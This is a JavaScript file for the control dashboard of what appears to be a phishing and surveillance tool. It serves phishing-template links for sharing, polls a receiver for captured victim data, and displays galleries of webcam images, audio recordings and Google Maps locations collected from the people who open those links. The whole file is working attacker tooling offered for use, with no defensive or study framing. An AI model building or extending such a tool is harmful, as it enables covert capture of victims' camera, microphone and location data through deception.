var old_data = '';
var log_history = [];

function Listener() {
    $.post("receiver.php", { "send_me_result": "" }, function (data) {
        if (data != "") {
            var timestamp = new Date().toLocaleTimeString();
            var logTypeClass = 'text-blue-400';
            var displayData = data;

            if (data.includes("Image")) {
                show_notif("Image File Saved", 'Path : ' + data.slice(26), true);
                logTypeClass = 'text-purple-400 font-bold';
            } else if (data.includes("Audio")) {
                show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
                logTypeClass = 'text-pink-400 font-bold';
            } else if (data.includes("Google Map")) {
                show_notif("Google Map Link", data.slice(18), true);
                logTypeClass = 'text-emerald-400 font-bold';
            }

            var logEntry = `
                <div class="flex space-x-2 mb-1 font-mono text-sm animate__animated animate__fadeInLeft animate__faster border-l-2 border-slate-800 pl-2 hover:border-slate-600 transition-colors">
                    <span class="text-slate-500 select-none">[${timestamp}]</span>
                    <span class="${logTypeClass}">${displayData}</span>
                </div>
            `;

            $("#log-terminal").append(logEntry);

            var terminal = document.getElementById("log-terminal");
            terminal.scrollTop = terminal.scrollHeight;

            log_history.push(`[${timestamp}] ${data}`);
        }
    });
}

function getFullLogs() {
    return log_history.join("\n");
}

function show_notif(msg, path, status) {
    var btn_text = 'open file';
    var timer = 5000;
    var type_notif = "success";

    if (msg.includes("available")) {
        btn_text = "open link";
        timer = 0;
        type_notif = "danger";
    } else if (msg.includes("Google Map")) {
        btn_text = "open link";
        timer = 0;
    }

    // Using GrowlNotification (assuming it's loaded)
    // We might want to style this better or just rely on the library's default
    GrowlNotification.notify({
        title: msg,
        description: path,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true,
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function () {
                    window.open(path.replace("Path : ", ""), 'popUpWindow', 'height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
            cancel: {
                text: 'Cancel',
                callback: function () { }
            }
        },
    });
}

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

function saveTextAsFile(textToWrite, fileNameToSaveAs) {
    var textFileAsBlob = new Blob([textToWrite], { type: 'text/plain' });
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000) + "_" + fileNameToSaveAs;
    if (window.webkitURL != null) {
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    } else {
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }
    downloadLink.click();
}

function check_new_version() {
    return;
}

function loadImages() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/images.php', true); // Updated to match Flask API route
    xhr.onload = function () {
        try {
            var response = JSON.parse(xhr.responseText);
            var container = document.getElementById('images-gallery');
            if (!container) return;

            if (response.images && response.images.length > 0) {
                var html = '';
                response.images.forEach(function (img) {
                    html += `<div class="group relative aspect-square bg-slate-800 rounded-xl overflow-hidden border border-slate-700 shadow-md hover:shadow-xl transition-all">
                        <img src="${img.url}" alt="${img.name}" class="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110"/>
                        <div class="absolute inset-0 bg-slate-900/90 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col items-center justify-center space-y-3 p-4">
                            <span class="text-xs text-slate-300 font-mono text-center break-all line-clamp-2">${img.name}</span>
                            <div class="flex space-x-2">
                                <button onclick="viewFullImage('${img.url}')" class="p-2 bg-blue-600 text-white rounded-lg hover:bg-blue-500 transition-colors shadow-lg shadow-blue-500/30" title="View"><i class="fas fa-search"></i></button>
                                <button onclick="downloadImage('${img.url}', '${img.name}')" class="p-2 bg-slate-700 text-white rounded-lg hover:bg-slate-600 transition-colors border border-slate-600" title="Download"><i class="fas fa-download"></i></button>
                            </div>
                        </div>
                    </div>`;
                });
                container.innerHTML = html;
            } else {
                container.innerHTML = `<div class="col-span-full flex flex-col items-center justify-center py-20 text-slate-500">
                                <i class="fas fa-camera text-4xl mb-4 opacity-50"></i>
                                <p>No images captured yet</p>
                            </div>`;
            }
        } catch (e) {
            console.error("Error loading images:", e);
        }
    };
    xhr.send();
}

function loadAudio() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/audio.php', true); // Updated to match Flask API route
    xhr.onload = function () {
        try {
            var response = JSON.parse(xhr.responseText);
            var container = document.getElementById('audio-list');
            if (!container) return;

            if (response.audio && response.audio.length > 0) {
                var html = '';
                response.audio.forEach(function (audio) {
                    var timestamp = new Date(audio.timestamp * 1000).toLocaleString();
                    html += `<div class="bg-slate-800 rounded-xl p-4 border border-slate-700 flex flex-col md:flex-row items-start md:items-center justify-between group hover:border-slate-600 transition-colors gap-4">
                        <div class="flex items-center space-x-4">
                            <div class="w-10 h-10 rounded-full bg-purple-500/10 flex items-center justify-center text-purple-400 group-hover:bg-purple-500 group-hover:text-white transition-colors shrink-0">
                                <i class="fas fa-play"></i>
                            </div>
                            <div>
                                <div class="text-sm font-medium text-slate-200 break-all">${audio.name}</div>
                                <div class="text-xs text-slate-500">${timestamp}</div>
                            </div>
                        </div>
                        <div class="flex items-center space-x-4 w-full md:w-auto justify-between md:justify-end">
                            <audio controls class="h-8 w-full md:w-48 opacity-70 hover:opacity-100 transition-opacity">
                                <source src="${audio.url}" type="audio/wav">
                                Your browser does not support audio.
                            </audio>
                            <button onclick="downloadAudio('${audio.url}', '${audio.name}')" class="p-2 text-slate-400 hover:text-white transition-colors shrink-0">
                                <i class="fas fa-download"></i>
                            </button>
                        </div>
                    </div>`;
                });
                container.innerHTML = html;
            } else {
                container.innerHTML = `<div class="flex flex-col items-center justify-center py-20 text-slate-500">
                                <i class="fas fa-microphone text-4xl mb-4 opacity-50"></i>
                                <p>No audio recordings yet</p>
                            </div>`;
            }
        } catch (e) {
            console.error("Error loading audio:", e);
        }
    };
    xhr.send();
}

function viewFullImage(url) {
    var width = window.innerWidth * 0.9;
    var height = window.innerHeight * 0.9;
    window.open(url, 'imageViewer', `width=${width},height=${height},resizable=yes,scrollbars=yes`);
}

function downloadImage(url, filename) {
    var link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
}

function downloadAudio(url, filename) {
    var link = document.createElement('a');
    link.href = url;
    link.download = filename;
    link.click();
}

function clearAllImages() {
    if (confirm('Delete all images?')) {
        alert('Backend deletion not yet implemented');
    }
}

function clearAllAudio() {
    if (confirm('Delete all audio?')) {
        alert('Backend deletion not yet implemented');
    }
}

function loadPhishingTemplates() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/list_templates.php', true);
    xhr.onload = function () {
        try {
            var data = JSON.parse(xhr.responseText);
            var container = document.getElementById('links-container');
            if (!container) return;

            var html = '';
            if (Array.isArray(data) && data.length > 0) {
                data.forEach(function (template) {
                    var url = location.protocol + "//" + location.host + "/t/" + template.trim() + "/";

                    html += `<div class="bg-slate-800 rounded-xl p-5 border border-slate-700 shadow-sm hover:shadow-md transition-all group animate__animated animate__fadeIn">
                        <div class="flex items-center justify-between mb-4">
                            <div class="flex items-center space-x-3">
                                <div class="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center text-blue-400 group-hover:bg-blue-500 group-hover:text-white transition-colors">
                                    <i class="fas fa-link"></i>
                                </div>
                                <h4 class="text-lg font-semibold text-slate-200 capitalize truncate max-w-[150px]" title="${template}">${template}</h4>
                            </div>
                            <span class="px-2 py-1 text-xs font-medium bg-emerald-500/10 text-emerald-400 rounded-full border border-emerald-500/20">Active</span>
                        </div>
                        <div class="space-y-3">
                            <div class="relative">
                                <input type="text" readonly value="${url}" class="w-full bg-slate-900 border border-slate-700 text-slate-400 text-sm rounded-lg pl-3 pr-10 py-2 focus:ring-1 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all font-mono">
                                <button onclick="copyToClipboard(this, '${url}')" class="absolute right-1 top-1 bottom-1 px-3 text-slate-400 hover:text-white hover:bg-slate-700 rounded-md transition-colors" title="Copy Link">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                            <a href="${url}" target="_blank" class="block w-full text-center py-2 text-sm font-medium text-slate-400 hover:text-blue-400 transition-colors border border-dashed border-slate-700 rounded-lg hover:border-blue-500/50 hover:bg-slate-800/50">
                                <i class="fas fa-external-link-alt mr-2"></i> Open Link
                            </a>
                        </div>
                    </div>`;
                });
            } else {
                html = '<div class="col-span-full text-center p-10 text-slate-500">No templates available</div>';
            }
            container.innerHTML = html;
        } catch (e) {
            console.error("Error loading templates:", e);
            var container = document.getElementById('links-container');
            if (container) {
                container.innerHTML = '<div class="col-span-full text-center p-10 text-red-400">Error loading templates</div>';
            }
        }
    };
    xhr.send();
}

function copyToClipboard(btn, url) {
    navigator.clipboard.writeText(url).then(() => {
        var icon = btn.querySelector('i');
        var originalClass = icon.className;

        icon.className = 'fas fa-check text-emerald-400';

        if (window.Swal) {
            const Toast = Swal.mixin({
                toast: true,
                position: 'top-end',
                showConfirmButton: false,
                timer: 2000,
                timerProgressBar: true,
                background: '#1e293b',
                color: '#fff',
                customClass: {
                    popup: 'border border-slate-700 rounded-xl shadow-xl'
                },
                didOpen: (toast) => {
                    toast.addEventListener('mouseenter', Swal.stopTimer)
                    toast.addEventListener('mouseleave', Swal.resumeTimer)
                }
            })

            Toast.fire({
                icon: 'success',
                title: 'Link copied to clipboard'
            })
        }

        setTimeout(() => {
            icon.className = originalClass;
        }, 2000);
    });
}


window.addEventListener('load', function () {
    console.log("Dashboard loading...");

    // Initialize tabs
    var tabButtons = document.querySelectorAll('.tab-btn');

    // Helper to set active state
    function setActiveTab(tabId) {
        // Reset all buttons
        tabButtons.forEach(btn => {
            btn.classList.remove('border-blue-500', 'text-blue-400', 'active');
            btn.classList.add('border-transparent', 'text-slate-400');

            // Reset icon colors
            var icon = btn.querySelector('i');
            if (icon) icon.classList.remove('text-blue-400');
        });

        // Hide all contents
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.add('hidden');
            content.classList.remove('active');
        });

        // Activate button
        var activeBtn = document.querySelector(`.tab-btn[data-tab="${tabId}"]`);
        if (activeBtn) {
            activeBtn.classList.remove('border-transparent', 'text-slate-400');
            activeBtn.classList.add('border-blue-500', 'text-blue-400', 'active');

            var icon = activeBtn.querySelector('i');
            if (icon) icon.classList.add('text-blue-400');
        }

        // Show content
        var activeContent = document.getElementById('tab-' + tabId);
        if (activeContent) {
            activeContent.classList.remove('hidden');
            activeContent.classList.add('active');
        }
    }

    tabButtons.forEach(function (btn) {
        btn.addEventListener('click', function (e) {
            e.preventDefault();
            var tabName = this.getAttribute('data-tab');
            setActiveTab(tabName);

            // Load content
            if (tabName === 'images') {
                loadImages();
            } else if (tabName === 'audio') {
                loadAudio();
            }
        });
    });

    // Initial load
    setTimeout(function () {
        loadPhishingTemplates();

        var timer = setInterval(Listener, 2000);
        var isListening = true;

        var btnRefreshImages = document.getElementById('btn-refresh-images');
        if (btnRefreshImages) {
            btnRefreshImages.addEventListener('click', function () {
                var icon = this.querySelector('i');
                if (icon) icon.classList.add('fa-spin');
                loadImages();
                setTimeout(() => {
                    if (icon) icon.classList.remove('fa-spin');
                }, 1000);
            });
        }

        var btnClearImages = document.getElementById('btn-clear-images');
        if (btnClearImages) {
            btnClearImages.addEventListener('click', clearAllImages);
        }

        var btnRefreshAudio = document.getElementById('btn-refresh-audio');
        if (btnRefreshAudio) {
            btnRefreshAudio.addEventListener('click', function () {
                var icon = this.querySelector('i');
                if (icon) icon.classList.add('fa-spin');
                loadAudio();
                setTimeout(() => {
                    if (icon) icon.classList.remove('fa-spin');
                }, 1000);
            });
        }

        var btnClearAudio = document.getElementById('btn-clear-audio');
        if (btnClearAudio) {
            btnClearAudio.addEventListener('click', clearAllAudio);
        }

        var btnListen = document.getElementById('btn-listen');
        if (btnListen) {
            btnListen.addEventListener('click', function () {
                if (isListening) {
                    clearInterval(timer);
                    this.innerHTML = '<i class="fas fa-play"></i> <span>Start Listener</span>';
                    this.classList.remove('bg-red-500/10', 'text-red-400', 'border-red-500/20');
                    this.classList.add('bg-emerald-500/10', 'text-emerald-400', 'border-emerald-500/20');
                    isListening = false;
                } else {
                    timer = setInterval(Listener, 2000);
                    this.innerHTML = '<i class="fas fa-stop"></i> <span>Stop Listener</span>';
                    this.classList.remove('bg-emerald-500/10', 'text-emerald-400', 'border-emerald-500/20');
                    this.classList.add('bg-red-500/10', 'text-red-400', 'border-red-500/20');
                    isListening = true;
                }
            });
        }

        var btnClear = document.getElementById('btn-clear');
        if (btnClear) {
            btnClear.addEventListener('click', function () {
                var terminal = document.getElementById('log-terminal');
                if (terminal) {
                    terminal.innerHTML = `<div class="flex space-x-2 mb-2">
                        <span class="text-slate-500">[System]</span>
                        <span class="text-emerald-400">Logs cleared. Waiting for interactions...</span>
                    </div>`;
                }
                log_history = [];
            });
        }

        var btnDownload = document.getElementById('btn-download');
        if (btnDownload) {
            btnDownload.addEventListener('click', function () {
                saveTextAsFile(getFullLogs(), 'log.txt');
            });
        }

        console.log("Dashboard initialized successfully!");
    }, 100);
});
